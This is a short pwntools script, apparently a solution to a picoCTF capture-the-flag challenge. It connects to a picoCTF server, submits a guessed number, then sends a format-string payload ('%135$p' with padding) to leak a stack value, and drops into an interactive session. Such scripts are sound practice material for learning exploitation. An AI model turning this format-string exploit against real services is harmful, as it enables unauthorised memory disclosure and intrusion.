from pwn import *

p = remote('shape-facility.picoctf.net', 64740)

magic_number = b"-3727"
p.recvuntil(b"What number would you like to guess?\n")
p.sendline(magic_number)

# Send a payload: format string + padding + marker
payload = b"%135$p" + b"A"*500 + b"END"
p.sendline(payload)

# Read response until marker "Congrats: "
result = p.recvuntil(b"Congrats: ")
print(result.decode())

p.interactive()
